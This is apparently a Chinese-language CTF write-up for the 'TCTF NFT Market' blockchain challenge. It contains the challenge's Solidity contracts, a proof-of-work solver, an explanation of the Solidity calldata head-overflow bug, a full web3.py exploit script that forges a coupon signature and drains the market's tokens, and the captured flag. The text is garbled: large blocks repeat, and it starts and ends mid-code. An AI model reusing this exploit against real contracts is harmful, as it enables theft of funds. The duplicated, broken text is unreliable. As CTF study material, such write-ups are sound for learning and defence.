. transferFrom ( msg . sender , owner , order . price ); nft . safeTransferFrom ( owner , msg . sender , order . tokenId ); emit NFTBought ( msg . sender , order . nftAddress , order . tokenId , order . price ); } function purchaseWithCoupon ( SignedCoupon calldata scoupon ) external { Coupon memory coupon = scoupon . coupon ; require ( coupon . user == msg . sender , \"Invalid user\" ); require ( coupon . newprice > 0 , \"Invalid price\" ); verifier . verifyCoupon ( scoupon ); Order memory order = getOrder ( coupon . orderId ); _deleteOrder ( coupon . orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( coupon . user , owner , coupon . newprice ); nft . safeTransferFrom ( owner , coupon . user , order . tokenId ); emit NFTBought ( coupon . user , order . nftAddress , order . tokenId , coupon . newprice ); } function purchaseTest ( address nftAddress , uint256 tokenId , uint256 price ) external { require ( ! tested , \"Tested\" ); tested = true ; IERC721 nft = IERC721 ( nftAddress ); uint256 orderId = TctfMarket ( this ). createOrder ( nftAddress , tokenId , price ); nft . approve ( address ( this ), tokenId ); TctfMarket ( this ). purchaseOrder ( orderId ); } function win () external { require ( tctfNFT . ownerOf ( 1 ) == msg . sender && tctfNFT . ownerOf ( 2 ) == msg . sender && tctfNFT . ownerOf ( 3 ) == msg . sender ); emit SendFlag (); } function isNFTApprovedOrOwner ( address nftAddress , address spender , uint256 tokenId ) internal view returns ( bool ) { IERC721 nft = IERC721 ( nftAddress ); address owner = nft . ownerOf ( tokenId ); return ( spender == owner || nft . isApprovedForAll ( owner , spender ) || nft . getApproved ( tokenId ) == spender ); } function _deleteOrder ( uint256 orderId ) internal { orders [ orderId ] = orders [ orders . length - 1 ]; orders . pop (); } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } contract CouponVerifierBeta { TctfMarket market ; bool tested ; constructor () { market = TctfMarket ( msg . sender ); } function verifyCoupon ( SignedCoupon calldata scoupon ) public { require ( ! tested , \"Tested\" ); tested = true ; Coupon memory coupon = scoupon . coupon ; Signature memory sig = scoupon . signature ; Order memory order = market . getOrder ( coupon . orderId ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); require ( coupon . issuer == owner , \"Invalid issuer\" ); require ( ecrecover ( keccak256 ( serialized ), sig . v , sig . rs [ 0 ], sig . rs [ 1 ]) == coupon . issuer , \"Invalid signature\" ); } } \u901a\u8fc7 airdrop() \u548c purchaseTest() \u5bb9\u6613\u83b7\u5f97 tokenId \u4e3a 1\u30012 \u7684 TNFT\u3002\u8981\u83b7\u5f97 tokenId \u4e3a 3 \u7684 TNFT \u663e\u7136\u9700\u8981\u4f7f\u7528\u5230 purchaseWithCoupon() \uff0c\u4f46\u6240\u6709\u8005\u4e3a\u5408\u7ea6\uff0c\u4e0d\u5b58\u5728\u80fd\u591f\u7528\u4e8e\u7b7e\u540d\u7684\u79c1\u94a5\uff0c verifyCoupon() \u7684\u5224\u65ad\u6761\u4ef6\u4e5f\u76f8\u5f53\u4e25\u683c\uff0c\u65e0\u6cd5\u4f2a\u9020\u7b7e\u540d \u867d\u7136\u6709\u60f3\u8fc7\u901a\u8fc7 purchaseWithCoupon() \u6765\u7a83\u53d6\u5408\u7ea6 TctfToken \u7684 TTK\uff0c\u4f46 purchaseWithCoupon() \u9650\u5236\u4e86 msg.sender \u5fc5\u987b\u4e3a coupon.user (\u2565\u03c9\u2565) \u5728 0.8.16 \u4e4b\u524d\u5b58\u5728 Head Overflow \u7684 Bug\uff0c\u53d1\u751f\u5728 calldata tuple \u8fdb\u884c ABI \u91cd\u7f16\u7801\u65f6\uff0c SignedCoupon \u6070\u597d\u6ee1\u8db3\u6f0f\u6d1e\u89e6\u53d1\u7684\u6761\u4ef6 tuple \u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u662f\u9759\u6001\u6570\u7ec4\u4e14\u5b58\u50a8\u5728 calldata \uff0c\u6570\u7ec4\u5143\u7d20\u4e3a\u57fa\u672c\u7c7b\u578b uint \u6216 bytes32 \uff0c\u5bf9\u5e94 Signature \u4e2d\u7684 bytes32[2] rs tuple \u5305\u542b\u81f3\u5c11\u4e00\u4e2a\u52a8\u6001\u5143\u7d20\uff0c\u5982 bytes \u6216\u5305\u542b\u52a8\u6001\u6570\u7ec4\u7684\u7ed3\u6784\u4f53\uff0c\u5373 Coupon \u4e2d\u7684 bytes reason \u4ee3\u7801\u4f7f\u7528 ABI coder v2\uff08\u81ea 0.8.0 \u8d77\u9ed8\u8ba4\uff09 tuple \u7684 ABI \u7f16\u7801\u5305\u542b\u4e24\u90e8\u5206\uff0c\u9759\u6001\u7f16\u7801\u7684 head \u4ee5\u53ca\u52a8\u6001\u7f16\u7801\u7684 tail \uff0c head \u4e2d\u5305\u542b\u9759\u6001\u5143\u7d20\u4ee5\u53ca\u52a8\u6001\u5143\u7d20\u81ea\u7f16\u7801\u8d77\u7684\u504f\u79fb\uff0c\u52a8\u6001\u5143\u7d20\u5b9e\u9645\u5b58\u50a8\u5728 tail \u4e2d \u7f16\u7801\u540e\u7684 scoupon \u53c2\u6570\u5e03\u5c40\u5982\u4e0b\uff0c\u5e95\u90e8\u6570\u5b57\u8868\u793a\u7f16\u7801\u7684\u987a\u5e8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+ | HEAD | | TAIL | +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+ | value of scoupon | | value of coupon | | SignedCoupon | | Coupon | | | | | | | | | +------------------+--------------------------+ +-------------------------------------------------------------------------------------------+-----------------+ | offset of coupon | value of signature | | HEAD of Coupon | TAIL of Coupon | | | Signature | | | | | uint +------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ | | value of v | value of rs | | value of orderId | value of newprice | value of issuer | value of user | offset of reason | value of reason | | | int8 | bytes32[2] | | uint256 | uint256 | address | address | uint | bytes | +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ | 1 | 8 | 9 | | 2 | 3 | 4 | 5 | 6 | 7 | +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ \u5f53\u9759\u6001\u6570\u7ec4\u4f5c\u4e3a\u7ed3\u6784\u4f53\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u65f6\uff0c\u5176\u540e tail \u7684\u524d \\(32\\) \u5b57\u8282\u5c06\u88ab\u8986\u76d6\uff08\u5b9e\u9645\u5c06\u88ab\u8986\u76d6\u4e3a \\(0\\) \uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53 purchaseWithCoupon() \u8c03\u7528 verifyCoupon() \u65f6\uff0c\u5b9e\u9645\u53c2\u4e0e\u9a8c\u8bc1\u7684\u90fd\u662f orderId \u4e3a 0 \u7684\u8ba2\u5355 \u9996\u5148\u518d\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u5e76 mint() 1 \u4e2a token\uff0c\u5229\u7528 purchaseTest() \u8f6c\u79fb TctfMarket \u7684\u6240\u6709\u4f59\u989d\u3002\u968f\u540e purchaseOrder(1) \uff0c\u6b64\u65f6 tokenId \u4e3a 3 \u7684\u8ba2\u5355\u4e0b\u6807\u4e3a 1 \uff0c\u63a5\u7740 createOrder() \u4f7f\u5f97\u8c03\u7528 purchaseOrder(0) \u540e orderId \u4e3a 0 \u7684\u8ba2\u5355\u53d7\u63a7\uff0c\u4ece\u800c\u80fd\u5bf9\u5176\u8fdb\u884c\u7b7e\u540d\u5e76\u901a\u8fc7\u9a8c\u8bc1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from web3 import Web3 import json , eth_abi , requests def transact ( func , gas = 1000000 ): # \u5b8c\u5584 transaction \u76f8\u5173\u53c2\u6570\u907f\u514d 401 Client Error: Unauthorized for url # \u53c2\u8003\uff1ahttps://github.com/chainflag/eth-challenge-base/issues/19 tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) w3 = Web3 ( Web3 . HTTPProvider ( \"http://47.102.40.39:8545\" )) account = w3 . eth . account . create () print ( account . address , account . privateKey . hex ()) tx_hash = requests . post ( 'http://47.102.40.39:8080/api/claim' , data = { 'address' : account . address }) . text . split ( ' ' )[ 1 ] if tx_hash . startswith ( '0x' ): w3 . eth . wait_for_transaction_receipt ( tx_hash ) market_addr = '0x6FcDb85597567cACe6DCacE3cd58Da6fea815cB6' market_abi = json . loads ( open ( 'NFTmarket/market_abi.json' ) . read ()) token_abi = json . loads ( open ( 'NFTmarket/token_abi.json' ) . read ()) nft_abi = json . loads ( open ( 'NFTmarket/nft_abi.json' ) . read ()) market_contract = w3 . eth . contract ( address = market_addr , abi = market_abi ) token_addr = market_contract . functions . tctfToken () . call () token_contract = w3 . eth . contract ( address = token_addr , abi = token_abi ) nft_addr = market_contract . functions . tctfNFT () . call () nft_contract = w3 . eth . contract ( address = nft_addr , abi = nft_abi ) nft_bytecode = open ( 'NFTmarket/nft_bytecode.txt' ) . read () fnft_contract = w3 . eth . contract ( abi = nft_abi , bytecode = nft_bytecode ) # \u6c7d\u6cb9\u8d39\u4e0d\u8db3\u4f1a\u5bfc\u81f4\u5408\u7ea6\u521b\u5efa\u5931\u8d25\uff0c\u4ecd\u7136\u80fd\u83b7\u5f97\u5408\u7ea6\u5730\u5740\uff0c\u4f46\u65e0\u6cd5\u4e0e\u4e4b\u4ea4\u4e92 fnft_addr = transact ( 'fnft_contract.constructor()' , fnft_contract . constructor () . estimateGas () * 2 ) . contractAddress print ( 'fake NFT:' , fnft_addr ) fnft_contract = w3 . eth . contract ( address = fnft_addr , abi = nft_abi ) transact ( 'fnft_contract.functions.mint(account.address, 1)' ) transact ( 'fnft_contract.functions.mint(account.address, 2)' ) transact ( 'fnft_contract.functions.setApprovalForAll(market_addr, True)' ) transact ( 'market_contract.functions.purchaseTest(fnft_addr, 1, 1337)' ) transact ( 'token_contract.functions.airdrop()' ) print ( 'Current TTK balance:' , token_contract . functions . balanceOf ( account . address ) . call ()) transact ( 'token_contract.functions.approve(market_addr, 1339)' ) transact ( 'market_contract.functions.purchaseOrder(1)' ) transact ( 'market_contract.functions.createOrder(fnft_addr, 2, 1)' ) transact ( 'market_contract.functions.purchaseOrder(0)' ) print ( market_contract . functions . getOrder ( 0 ) . call ()) print ( market_contract . functions . getOrder ( 1 ) . call ()) data = [ \"I, the issuer\" , account . address , \"offer a special discount for\" , account . address , \"to buy\" , [ fnft_addr , 2 , 1 ], \"at\" , 1 , \"because\" , b '' ] serialized = eth_abi . encode ([ 'string' , 'address' , 'string' , 'address' , 'string' , '(address,uint256,uint256)' , 'string' , 'uint' , 'string' , 'bytes' ], data ) serialized = serialized [: - 32 ] # eth_abi==2.2.0\uff0c\u5f53 bytes \u957f\u5ea6\u4e3a 0 \u65f6\u4ecd\u586b\u5145\u4e86 32 \u5b57\u8282 \\x00\uff0c\u6bd4\u901a\u8fc7 solidity \u8fdb\u884c abi.encode() \u7684\u7ed3\u679c\u591a 32 \u5b57\u8282 sig = w3 . eth . account . _sign_hash ( w3 . solidityKeccak ([ 'bytes' ], [ serialized ]), private_key = account . privateKey ) assert w3 . eth . account . _recover_hash ( w3 . solidityKeccak ([ 'bytes' ], [ serialized ]), signature = sig . signature . hex ()) == account . address scoupon = ({ 'coupon' : ( 1 , 1 , account . address , account . address , b '' ), # \u8d2d\u4e70 tokenId \u4e3a 3 \u7684 TNFT 'signature' : ( sig . v , [ w3 . toHex ( sig . r ), w3 . toHex ( sig . s )]) }) transact ( 'market_contract.functions.purchaseWithCoupon(scoupon)' ) print ( 'TNFT count:' , nft_contract . functions . balanceOf ( account . address ) . call ()) print ( transact ( 'market_contract.functions.win()' ) . transactionHash . hex ()) Flag \u00b6 flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d} \u53c2\u8003\u8d44\u6599 \u00b6 Head Overflow Bug in Calldata Tuple ABI-Reencoding | Solidity Blog Formal Specification of the Encoding","title":"TCTF NFT Market"},{"location":"blockchain/tctf_nft_market/#_1","text":"Welcome to TCTF NFT Market, a secure, open-source, and decentralized NFT marketplace! Trade your favourite NFTs (and flag) here! nc 47.102.40.39 20000","title":"\u9898\u76ee"},{"location":"blockchain/tctf_nft_market/#_2","text":"PoW.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import itertools , pwn from hashlib import sha256 from string import ascii_letters , digits table = ascii_letters + digits conn = pwn . remote ( '47.102.40.39' , 20000 ) ret = conn . recvline_contains ( 'sha256' ) . decode () base = ret [ ret . find ( '(' ) + 1 : ret . find ( '+ ???' )] . strip () for ch in itertools . permutations ( table , 4 ): m = base + '' . join ( ch ) if sha256 ( m . encode ()) . hexdigest () . endswith ( '00000' ): conn . sendafter ( '[-] ??? =' , f ' { m [ - 4 :] } \\n ' ) break conn . interactive () \u6301\u6709 tokenId \u4e3a 1\u30012\u30013 \u7684 TNFT \u5373\u53ef\u89e6\u53d1\u4e8b\u4ef6 SendFlag \u53ef\u4ee5\u8c03\u7528\u4e00\u6b21 airdrop() \u83b7\u5f97 5 TTK \u5f53\u6301\u6709\u6216\u88ab\u6279\u51c6\u4f7f\u7528 TNFT \u65f6\uff0c\u53ef\u4ee5 createOrder() \u6216 cancelOrder() \u5f53\u6301\u6709\u8db3\u591f TTK \u65f6\u53ef\u4ee5 purchaseOrder() \u53ef\u4ee5\u4f7f\u7528\u7ecf TNFT \u6240\u6709\u8005\u7b7e\u540d\u7684 coupon \u8c03\u7528\u4e00\u6b21 purchaseWithCoupon() \uff0c\u4ee5\u4fee\u6539\u540e\u7684\u4ef7\u683c\u8fdb\u884c\u8d2d\u4e70 \u53ef\u4ee5\u8fdb\u884c\u4e00\u6b21 purchaseTest() \uff0c TctfMarket \u5c06\u81ea\u5df1\u5b8c\u6210\u8ba2\u5355\u7684\u521b\u5efa\u4e0e\u8d2d\u4e70\uff0c\u7531\u4e8e approve \u4e0d\u80fd\u6388\u6743\u7ed9\u6240\u6709\u8005\uff0c\u53ef\u4ee5\u5229\u7528 purchaseTest() \u6765\u8f6c\u79fb TctfMarket \u7684 TTK task.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.15 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; contract TctfNFT is ERC721 , Ownable { constructor () ERC721 ( \"TctfNFT\" , \"TNFT\" ) { _setApprovalForAll ( address ( this ), msg . sender , true ); } function mint ( address to , uint256 tokenId ) external onlyOwner { _mint ( to , tokenId ); } } contract TctfToken is ERC20 { bool airdropped ; constructor () ERC20 ( \"TctfToken\" , \"TTK\" ) { _mint ( address ( this ), 100000000000 ); _mint ( msg . sender , 1337 ); } function airdrop () external { require ( ! airdropped , \"Already airdropped\" ); airdropped = true ; _mint ( msg . sender , 5 ); } } struct Order { address nftAddress ; uint256 tokenId ; uint256 price ; } struct Coupon { uint256 orderId ; uint256 newprice ; address issuer ; address user ; bytes reason ; } struct Signature { uint8 v ; bytes32 [ 2 ] rs ; } struct SignedCoupon { Coupon coupon ; Signature signature ; } contract TctfMarket { event SendFlag (); event NFTListed ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); event NFTCanceled ( address indexed seller , address indexed nftAddress , uint256 indexed tokenId ); event NFTBought ( address indexed buyer , address indexed nftAddress , uint256 indexed tokenId , uint256 price ); bool tested ; TctfNFT public tctfNFT ; TctfToken public tctfToken ; CouponVerifierBeta public verifier ; Order [] orders ; constructor () { tctfToken = new TctfToken (); tctfToken . approve ( address ( this ), type ( uint256 ). max ); tctfNFT = new TctfNFT (); tctfNFT . mint ( address ( tctfNFT ), 1 ); tctfNFT . mint ( address ( this ), 2 ); tctfNFT . mint ( address ( this ), 3 ); verifier = new CouponVerifierBeta (); orders . push ( Order ( address ( tctfNFT ), 1 , 1 )); orders . push ( Order ( address ( tctfNFT ), 2 , 1337 )); orders . push ( Order ( address ( tctfNFT ), 3 , 13333333337 )); } function getOrder ( uint256 orderId ) public view returns ( Order memory order ) { require ( orderId < orders . length , \"Invalid orderId\" ); order = orders [ orderId ]; } function createOrder ( address nftAddress , uint256 tokenId , uint256 price ) external returns ( uint256 ) { require ( price > 0 , \"Invalid price\" ); require ( isNFTApprovedOrOwner ( nftAddress , msg . sender , tokenId ), \"Not owner\" ); orders . push ( Order ( nftAddress , tokenId , price )); emit NFTListed ( msg . sender , nftAddress , tokenId , price ); return orders . length - 1 ; } function cancelOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); require ( isNFTApprovedOrOwner ( order . nftAddress , msg . sender , order . tokenId ), \"Not owner\" ); _deleteOrder ( orderId ); emit NFTCanceled ( msg . sender , order . nftAddress , order . tokenId ); } function purchaseOrder ( uint256 orderId ) external { Order memory order = getOrder ( orderId ); _deleteOrder ( orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( msg . sender , owner , order . price ); nft . safeTransferFrom ( owner , msg . sender , order . tokenId ); emit NFTBought ( msg . sender , order . nftAddress , order . tokenId , order . price ); } function purchaseWithCoupon ( SignedCoupon calldata scoupon ) external { Coupon memory coupon = scoupon . coupon ; require ( coupon . user == msg . sender , \"Invalid user\" ); require ( coupon . newprice > 0 , \"Invalid price\" ); verifier . verifyCoupon ( scoupon ); Order memory order = getOrder ( coupon . orderId ); _deleteOrder ( coupon . orderId ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); tctfToken . transferFrom ( coupon . user , owner , coupon . newprice ); nft . safeTransferFrom ( owner , coupon . user , order . tokenId ); emit NFTBought ( coupon . user , order . nftAddress , order . tokenId , coupon . newprice ); } function purchaseTest ( address nftAddress , uint256 tokenId , uint256 price ) external { require ( ! tested , \"Tested\" ); tested = true ; IERC721 nft = IERC721 ( nftAddress ); uint256 orderId = TctfMarket ( this ). createOrder ( nftAddress , tokenId , price ); nft . approve ( address ( this ), tokenId ); TctfMarket ( this ). purchaseOrder ( orderId ); } function win () external { require ( tctfNFT . ownerOf ( 1 ) == msg . sender && tctfNFT . ownerOf ( 2 ) == msg . sender && tctfNFT . ownerOf ( 3 ) == msg . sender ); emit SendFlag (); } function isNFTApprovedOrOwner ( address nftAddress , address spender , uint256 tokenId ) internal view returns ( bool ) { IERC721 nft = IERC721 ( nftAddress ); address owner = nft . ownerOf ( tokenId ); return ( spender == owner || nft . isApprovedForAll ( owner , spender ) || nft . getApproved ( tokenId ) == spender ); } function _deleteOrder ( uint256 orderId ) internal { orders [ orderId ] = orders [ orders . length - 1 ]; orders . pop (); } function onERC721Received ( address , address , uint256 , bytes memory ) public pure returns ( bytes4 ) { return this . onERC721Received . selector ; } } contract CouponVerifierBeta { TctfMarket market ; bool tested ; constructor () { market = TctfMarket ( msg . sender ); } function verifyCoupon ( SignedCoupon calldata scoupon ) public { require ( ! tested , \"Tested\" ); tested = true ; Coupon memory coupon = scoupon . coupon ; Signature memory sig = scoupon . signature ; Order memory order = market . getOrder ( coupon . orderId ); bytes memory serialized = abi . encode ( \"I, the issuer\" , coupon . issuer , \"offer a special discount for\" , coupon . user , \"to buy\" , order , \"at\" , coupon . newprice , \"because\" , coupon . reason ); IERC721 nft = IERC721 ( order . nftAddress ); address owner = nft . ownerOf ( order . tokenId ); require ( coupon . issuer == owner , \"Invalid issuer\" ); require ( ecrecover ( keccak256 ( serialized ), sig . v , sig . rs [ 0 ], sig . rs [ 1 ]) == coupon . issuer , \"Invalid signature\" ); } } \u901a\u8fc7 airdrop() \u548c purchaseTest() \u5bb9\u6613\u83b7\u5f97 tokenId \u4e3a 1\u30012 \u7684 TNFT\u3002\u8981\u83b7\u5f97 tokenId \u4e3a 3 \u7684 TNFT \u663e\u7136\u9700\u8981\u4f7f\u7528\u5230 purchaseWithCoupon() \uff0c\u4f46\u6240\u6709\u8005\u4e3a\u5408\u7ea6\uff0c\u4e0d\u5b58\u5728\u80fd\u591f\u7528\u4e8e\u7b7e\u540d\u7684\u79c1\u94a5\uff0c verifyCoupon() \u7684\u5224\u65ad\u6761\u4ef6\u4e5f\u76f8\u5f53\u4e25\u683c\uff0c\u65e0\u6cd5\u4f2a\u9020\u7b7e\u540d \u867d\u7136\u6709\u60f3\u8fc7\u901a\u8fc7 purchaseWithCoupon() \u6765\u7a83\u53d6\u5408\u7ea6 TctfToken \u7684 TTK\uff0c\u4f46 purchaseWithCoupon() \u9650\u5236\u4e86 msg.sender \u5fc5\u987b\u4e3a coupon.user (\u2565\u03c9\u2565) \u5728 0.8.16 \u4e4b\u524d\u5b58\u5728 Head Overflow \u7684 Bug\uff0c\u53d1\u751f\u5728 calldata tuple \u8fdb\u884c ABI \u91cd\u7f16\u7801\u65f6\uff0c SignedCoupon \u6070\u597d\u6ee1\u8db3\u6f0f\u6d1e\u89e6\u53d1\u7684\u6761\u4ef6 tuple \u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u662f\u9759\u6001\u6570\u7ec4\u4e14\u5b58\u50a8\u5728 calldata \uff0c\u6570\u7ec4\u5143\u7d20\u4e3a\u57fa\u672c\u7c7b\u578b uint \u6216 bytes32 \uff0c\u5bf9\u5e94 Signature \u4e2d\u7684 bytes32[2] rs tuple \u5305\u542b\u81f3\u5c11\u4e00\u4e2a\u52a8\u6001\u5143\u7d20\uff0c\u5982 bytes \u6216\u5305\u542b\u52a8\u6001\u6570\u7ec4\u7684\u7ed3\u6784\u4f53\uff0c\u5373 Coupon \u4e2d\u7684 bytes reason \u4ee3\u7801\u4f7f\u7528 ABI coder v2\uff08\u81ea 0.8.0 \u8d77\u9ed8\u8ba4\uff09 tuple \u7684 ABI \u7f16\u7801\u5305\u542b\u4e24\u90e8\u5206\uff0c\u9759\u6001\u7f16\u7801\u7684 head \u4ee5\u53ca\u52a8\u6001\u7f16\u7801\u7684 tail \uff0c head \u4e2d\u5305\u542b\u9759\u6001\u5143\u7d20\u4ee5\u53ca\u52a8\u6001\u5143\u7d20\u81ea\u7f16\u7801\u8d77\u7684\u504f\u79fb\uff0c\u52a8\u6001\u5143\u7d20\u5b9e\u9645\u5b58\u50a8\u5728 tail \u4e2d \u7f16\u7801\u540e\u7684 scoupon \u53c2\u6570\u5e03\u5c40\u5982\u4e0b\uff0c\u5e95\u90e8\u6570\u5b57\u8868\u793a\u7f16\u7801\u7684\u987a\u5e8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+ | HEAD | | TAIL | +---------------------------------------------+ +-------------------------------------------------------------------------------------------------------------+ | value of scoupon | | value of coupon | | SignedCoupon | | Coupon | | | | | | | | | +------------------+--------------------------+ +-------------------------------------------------------------------------------------------+-----------------+ | offset of coupon | value of signature | | HEAD of Coupon | TAIL of Coupon | | | Signature | | | | | uint +------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ | | value of v | value of rs | | value of orderId | value of newprice | value of issuer | value of user | offset of reason | value of reason | | | int8 | bytes32[2] | | uint256 | uint256 | address | address | uint | bytes | +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ | 1 | 8 | 9 | | 2 | 3 | 4 | 5 | 6 | 7 | +------------------+------------+-------------+ +------------------+-------------------+-----------------+---------------+------------------+-----------------+ \u5f53\u9759\u6001\u6570\u7ec4\u4f5c\u4e3a\u7ed3\u6784\u4f53\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u65f6\uff0c\u5176\u540e tail \u7684\u524d \\(32\\) \u5b57\u8282\u5c06\u88ab\u8986\u76d6\uff08\u5b9e\u9645\u5c06\u88ab\u8986\u76d6\u4e3a \\(0\\) \uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53 purchaseWithCoupon() \u8c03\u7528 verifyCoupon() \u65f6\uff0c\u5b9e\u9645\u53c2\u4e0e\u9a8c\u8bc1\u7684\u90fd\u662f orderId \u4e3a 0 \u7684\u8ba2\u5355 \u9996\u5148\u518d\u521b\u5efa\u4e00\u4e2a TctfNFT \u5408\u7ea6\u5e76 mint() 1 \u4e2a token\uff0c\u5229\u7528 purchaseTest() \u8f6c\u79fb TctfMarket \u7684\u6240\u6709\u4f59\u989d\u3002\u968f\u540e purchaseOrder(1) \uff0c\u6b64\u65f6 tokenId \u4e3a 3 \u7684\u8ba2\u5355\u4e0b\u6807\u4e3a 1 \uff0c\u63a5\u7740 createOrder() \u4f7f\u5f97\u8c03\u7528 purchaseOrder(0) \u540e orderId \u4e3a 0 \u7684\u8ba2\u5355\u53d7\u63a7\uff0c\u4ece\u800c\u80fd\u5bf9\u5176\u8fdb\u884c\u7b7e\u540d\u5e76\u901a\u8fc7\u9a8c\u8bc1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from web3 import Web3 import json , eth_abi , requests def transact ( func , gas = 1000000 ): # \u5b8c\u5584 transaction \u76f8\u5173\u53c2\u6570\u907f\u514d 401 Client Error: Unauthorized for url # \u53c2\u8003\uff1ahttps://github.com/chainflag/eth-challenge-base/issues/19 tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) w3 = Web3 ( Web3 . HTTPProvider ( \"http://47.102.40.39:8545\" )) account = w3 . eth . account . create () print ( account . address , account . privateKey . hex ()) tx_hash = requests . post ( 'http://47.102.40.39:8080/api/claim' , data = { 'address' : account . address }) . text . split ( ' ' )[ 1 ] if tx_hash . startswith ( '0x' ): w3 . eth . wait_for_transaction_receipt ( tx_hash ) market_addr = '0x6FcDb85597567cACe6DCacE3cd58Da6fea815cB6' market_abi = json . loads ( open ( 'NFTmarket/market_abi.json' ) . read ()) token_abi = json . loads ( open ( 'NFTmarket/token_abi.json' ) . read ()) nft_abi = json . loads ( open ( 'NFTmarket/nft_abi.json' ) . read ()) market_contract = w3 . eth . contract ( address = market_addr , abi = market_abi ) token_addr = market_contract . functions . tctfToken () . call () token_contract = w3 . eth . contract ( address = token_addr , abi = token_abi ) nft_addr = market_contract . functions . tctfNFT () . call () nft_contract = w3 . eth . contract ( address = nft_addr , abi = nft_abi ) nft_bytecode = open ( 'NFTmarket/nft_bytecode.txt' ) . read () fnft_contract = w3 . eth . contract ( abi = nft_abi , bytecode = nft_bytecode ) # \u6c7d\u6cb9\u8d39\u4e0d\u8db3\u4f1a\u5bfc\u81f4\u5408\u7ea6\u521b\u5efa\u5931\u8d25\uff0c\u4ecd\u7136\u80fd\u83b7\u5f97\u5408\u7ea6\u5730\u5740\uff0c\u4f46\u65e0\u6cd5\u4e0e\u4e4b\u4ea4\u4e92 fnft_addr = transact ( 'fnft_contract.constructor()' , fnft_contract . constructor () . estimateGas () * 2 ) . contractAddress print ( 'fake NFT:' , fnft_addr ) fnft_contract = w3 . eth . contract ( address = fnft_addr , abi = nft_abi ) transact ( 'fnft_contract.functions.mint(account.address, 1)' ) transact ( 'fnft_contract.functions.mint(account.address, 2)' ) transact ( 'fnft_contract.functions.setApprovalForAll(market_addr, True)' ) transact ( 'market_contract.functions.purchaseTest(fnft_addr, 1, 1337)' ) transact ( 'token_contract.functions.airdrop()' ) print ( 'Current TTK balance:' , token_contract . functions . balanceOf ( account . address ) . call ()) transact ( 'token_contract.functions.approve(market_addr, 1339)' ) transact ( 'market_contract.functions.purchaseOrder(1)' ) transact ( 'market_contract.functions.createOrder(fnft_addr, 2, 1)' ) transact ( 'market_contract.functions.purchaseOrder(0)' ) print ( market_contract . functions . getOrder ( 0 ) . call ()) print ( market_contract . functions . getOrder ( 1 ) . call ()) data = [ \"I, the issuer\" , account . address , \"offer a special discount for\" , account . address , \"to buy\" , [ fnft_addr , 2 